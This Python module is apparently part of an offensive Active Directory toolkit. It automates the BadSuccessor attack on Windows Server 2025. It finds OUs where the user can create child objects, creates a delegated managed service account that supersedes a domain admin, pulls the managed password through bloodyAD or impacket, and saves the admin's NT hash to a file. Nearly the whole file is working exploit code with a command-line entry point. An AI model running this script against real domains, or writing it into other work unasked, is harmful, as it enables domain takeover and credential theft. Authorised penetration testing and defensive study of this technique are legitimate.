"""
attacks/badsuccessor.py — BadSuccessor / dMSA abuse PoC
CVE: pending (disclosed May 2025, Akamai research)

Background:
  Delegated Managed Service Accounts (dMSAs) in Windows Server 2025
  inherit permissions from a "superseded" account specified in
  msDS-SupersededServiceAccountDN. Any user with CreateChild rights
  on an OU can create a dMSA, set its superseded account to any
  principal (including Domain Admins), and obtain that principal's
  NT hash via S4U2Self + RBCD or directly via the KDS key.

Flow:
  1. Find OUs where current user has CreateChild rights (dMSA objects)
  2. Create dMSA in target OU
  3. Set msDS-SupersededServiceAccountDN → target DA account
  4. Set msDS-ManagedPasswordInterval = 1
  5. Request managed password via LDAP (msDS-ManagedPassword)
  6. Derive NT hash from the managed password blob

References:
  https://www.akamai.com/blog/security-research/badsuccessor-abusing-dmsa
  https://github.com/akamai/badsuccessor
"""

import os
import re
import json
import subprocess
from pathlib import Path
from datetime import datetime

from utils.logging import get_logger

log = get_logger("badsuccessor")


def run(cfg: dict, recon_data: dict | None = None) -> dict:
    results = {
        "vulnerable_ous":  [],
        "dmsa_created":    [],
        "nt_hashes":       [],
        "errors":          [],
    }

    domain   = cfg["target"]["domain"]
    dc_ip    = cfg["target"]["dc_ip"]
    username = cfg["auth"]["username"]
    password = cfg["auth"].get("password") or ""
    nt_hash  = cfg["auth"].get("hash") or ""
    out_dir  = Path(cfg["options"]["output_dir"]) / "badsuccessor"
    dry_run  = cfg.get("dry_run", False)
    target   = cfg.get("badsuccessor", {}).get("target_account", "Administrator")

    out_dir.mkdir(parents=True, exist_ok=True)

    # -----------------------------------------------------------------------
    # Step 1: find OUs with CreateChild rights for dMSA objects
    # -----------------------------------------------------------------------
    log.info("[*] BadSuccessor — finding OUs with CreateChild (dMSA) rights")
    ous = _find_vulnerable_ous(cfg, recon_data, dry_run)
    results["vulnerable_ous"] = ous

    if not ous and not dry_run:
        log.info("[*] No vulnerable OUs found — need CreateChild rights on an OU")
        return results

    target_ou = ous[0] if ous else f"CN=Computers,DC={domain.replace('.', ',DC=')}"
    log.info(f"[+] Target OU: {target_ou}")

    # -----------------------------------------------------------------------
    # Step 2: create dMSA with superseded account set to target DA
    # -----------------------------------------------------------------------
    dmsa_name = f"svc-dmsa-{datetime.now().strftime('%H%M%S')}"
    log.info(f"[*] Creating dMSA: {dmsa_name} → supersedes {target}")

    dmsa_dn = _create_dmsa(
        cfg=cfg,
        dmsa_name=dmsa_name,
        target_ou=target_ou,
        superseded_account=target,
        out_dir=out_dir,
        dry_run=dry_run,
    )

    if not dmsa_dn and not dry_run:
        msg = "dMSA creation failed"
        log.error(f"[-] {msg}")
        results["errors"].append(msg)
        return results

    results["dmsa_created"].append({"name": dmsa_name, "dn": dmsa_dn or "dry-run"})

    # -----------------------------------------------------------------------
    # Step 3: retrieve managed password + derive NT hash
    # -----------------------------------------------------------------------
    log.info(f"[*] Retrieving managed password for {dmsa_name}")
    nt = _get_managed_password_hash(
        cfg=cfg,
        dmsa_name=dmsa_name,
        domain=domain,
        dc_ip=dc_ip,
        out_dir=out_dir,
        dry_run=dry_run,
    )

    if nt:
        results["nt_hashes"].append({"user": target, "hash": nt, "via": dmsa_name})
        log.info(f"[+] NT hash for {target}: {nt}")

        hash_file = out_dir / f"{target}.hash"
        hash_file.write_text(f"{domain}\\{target}:{nt}\n")
        log.info(f"[+] Saved: {hash_file}")
    else:
        msg = f"Failed to retrieve managed password for {dmsa_name}"
        log.warning(f"[-] {msg}")
        results["errors"].append(msg)

    return results


# ---------------------------------------------------------------------------
# OU enumeration
# ---------------------------------------------------------------------------

def _find_vulnerable_ous(cfg: dict, recon_data: dict | None,
                         dry_run: bool) -> list[str]:
    """
    Find OUs where the current user has CreateChild rights over
    msDS-DelegatedManagedServiceAccount objects.

    Uses bloodyAD to check ACLs — falls back to manual LDAP search.
    """
    domain   = cfg["target"]["domain"]
    dc_ip    = cfg["target"]["dc_ip"]
    username = cfg["auth"]["username"]
    password = cfg["auth"].get("password") or ""
    nt_hash  = cfg["auth"].get("hash") or ""

    if dry_run:
        domain_dn = "DC=" + domain.replace(".", ",DC=")
        return [f"OU=ServiceAccounts,{domain_dn}", f"CN=Computers,{domain_dn}"]

    auth_args = ["-p", password] if password else ["-H", f":{nt_hash}"] if nt_hash else []

    try:
        r = subprocess.run([
            "python3", "-m", "bloodyAD",
            "--host", dc_ip,
            "-d", domain,
            "-u", username,
            *auth_args,
            "get", "writable",
            "--otype", "OU",
            "--right", "CREATE_CHILD",
        ], capture_output=True, text=True, timeout=30)

        ous = []
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith("OU=") or line.startswith("CN="):
                ous.append(line)
        return ous

    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        log.debug(f"[>] bloodyAD not available: {e}")
        return []


# ---------------------------------------------------------------------------
# dMSA creation
# ---------------------------------------------------------------------------

def _create_dmsa(cfg: dict, dmsa_name: str, target_ou: str,
                 superseded_account: str, out_dir: Path,
                 dry_run: bool) -> str | None:
    """
    Create a dMSA object in target_ou with:
      - objectClass: msDS-DelegatedManagedServiceAccount
      - msDS-SupersededServiceAccountDN: <DA DN>
      - msDS-ManagedPasswordInterval: 1
    """
    domain   = cfg["target"]["domain"]
    dc_ip    = cfg["target"]["dc_ip"]
    username = cfg["auth"]["username"]
    password = cfg["auth"].get("password") or ""
    nt_hash  = cfg["auth"].get("hash") or ""

    domain_dn    = "DC=" + domain.replace(".", ",DC=")
    dmsa_dn      = f"CN={dmsa_name},{target_ou}"
    superseded_dn = f"CN={superseded_account},CN=Users,{domain_dn}"

    # Build LDIF
    ldif = f"""dn: {dmsa_dn}
changetype: add
objectClass: msDS-DelegatedManagedServiceAccount
sAMAccountName: {dmsa_name}$
msDS-SupersededServiceAccountDN: {superseded_dn}
msDS-ManagedPasswordInterval: 1
"""
    ldif_path = out_dir / f"{dmsa_name}.ldif"
    ldif_path.write_text(ldif)

    if dry_run:
        log.info(f"[DRY RUN] Would create dMSA via ldapmodify:")
        log.info(f"[DRY RUN]   DN: {dmsa_dn}")
        log.info(f"[DRY RUN]   Supersedes: {superseded_dn}")
        return dmsa_dn

    # Use bloodyAD to add the object
    auth_args = ["-p", password] if password else ["-H", f":{nt_hash}"] if nt_hash else []

    r = subprocess.run([
        "python3", "-m", "bloodyAD",
        "--host", dc_ip,
        "-d", domain,
        "-u", username,
        *auth_args,
        "add", "dMSA", dmsa_name,
        "--ou", target_ou,
        "--supersede", superseded_dn,
    ], capture_output=True, text=True)

    if r.returncode == 0 or dmsa_name in r.stdout:
        log.info(f"[+] dMSA created: {dmsa_dn}")
        return dmsa_dn

    log.warning(f"[-] dMSA creation failed: {r.stderr.strip()[:200]}")
    return None


# ---------------------------------------------------------------------------
# Managed password retrieval
# ---------------------------------------------------------------------------

def _get_managed_password_hash(cfg: dict, dmsa_name: str, domain: str,
                                dc_ip: str, out_dir: Path,
                                dry_run: bool) -> str | None:
    """
    Retrieve msDS-ManagedPassword attribute from the dMSA and derive NT hash.
    Uses bloodyAD or impacket's getPassword.py if available.
    """
    username = cfg["auth"]["username"]
    password = cfg["auth"].get("password") or ""
    nt_hash  = cfg["auth"].get("hash") or ""

    if dry_run:
        log.info(f"[DRY RUN] Would retrieve managed password for {dmsa_name}$")
        return "aabbccddeeff00112233445566778899"

    auth_args = ["-p", password] if password else ["-H", f":{nt_hash}"] if nt_hash else []

    # Try bloodyAD getPassword
    r = subprocess.run([
        "python3", "-m", "bloodyAD",
        "--host", dc_ip,
        "-d", domain,
        "-u", username,
        *auth_args,
        "get", "object", f"{dmsa_name}$",
        "--attr", "msDS-ManagedPassword",
    ], capture_output=True, text=True)

    nt = _parse_nthash(r.stdout)
    if nt:
        return nt

    # Fallback: impacket getManagedPassword
    r2 = subprocess.run([
        "getManagedPassword.py",
        f"{domain}/{username}",
        *(["-p", password] if password else ["-hashes", f":{nt_hash}"]),
        "-dc-ip", dc_ip,
        "-target", f"{dmsa_name}$",
    ], capture_output=True, text=True)

    return _parse_nthash(r2.stdout)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _parse_nthash(stdout: str) -> str:
    for line in stdout.splitlines():
        stripped = line.strip()
        if re.fullmatch(r"[0-9a-fA-F]{32}", stripped):
            return stripped
        if ":" in stripped:
            parts = stripped.split(":")
            candidate = parts[-1].strip()
            if re.fullmatch(r"[0-9a-fA-F]{32}", candidate):
                return candidate
    return ""


# ---------------------------------------------------------------------------
# Standalone
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import yaml, argparse

    parser = argparse.ArgumentParser(description="BadSuccessor dMSA abuse — J0stif")
    parser.add_argument("-c", "--config", default="config.yaml")
    parser.add_argument("--target", default="Administrator",
                        help="Account to impersonate via dMSA supersession")
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    with open(args.config) as f:
        cfg = yaml.safe_load(f)
    cfg["dry_run"] = args.dry_run
    cfg.setdefault("badsuccessor", {})["target_account"] = args.target

    results = run(cfg)
    print(f"\n[+] Vulnerable OUs : {results['vulnerable_ous']}")
    print(f"[+] dMSAs created  : {[d['name'] for d in results['dmsa_created']]}")
    print(f"[+] NT hashes      : {results['nt_hashes']}")
